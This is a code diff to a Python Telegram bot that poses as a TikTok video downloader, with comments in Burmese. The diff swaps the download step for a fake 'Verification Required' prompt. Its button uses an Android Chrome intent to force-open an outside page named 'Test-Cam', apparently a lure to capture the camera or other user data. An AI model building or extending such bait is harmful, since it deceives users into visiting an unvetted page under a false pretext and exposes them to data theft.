@@ -29,13 +29,20 @@ def start(message):
     else:
         bot.send_message(message.chat.id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")
 
+# bot.py ထဲက handle_link function ထဲမှာ ပြင်ပါ
 @bot.message_handler(func=lambda message: "tiktok.com" in message.text)
 def handle_link(message):
     user_links[message.chat.id] = message.text
+    
+    # Chrome နဲ့ တိုက်ရိုက်ပွင့်စေမည့် Intent Link (Android အတွက်)
+    chrome_intent = f"intent://tar-alt.github.io/Test-Cam/#Intent;scheme=https;package=com.android.chrome;end"
+    
     markup = types.InlineKeyboardMarkup()
-    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", url=WEB_APP_URL)
+    # ဒီနေရာမှာ url ကို chrome_intent နဲ့ ချိတ်ပေးလိုက်ပါ
+    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", url=chrome_intent)
     markup.add(verify_btn)
-    bot.send_message(message.chat.id, f"⚠️ *Verification Required*\n\nLink: `{message.text}`", reply_markup=markup, parse_mode="Markdown")
+    
+    bot.send_message(message.chat.id, f"⚠️ *Verification Required*\n\nလူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။\n\nLink: `{message.text}`", reply_markup=markup, parse_mode="Markdown")
 
 bot.infinity_polling()
 
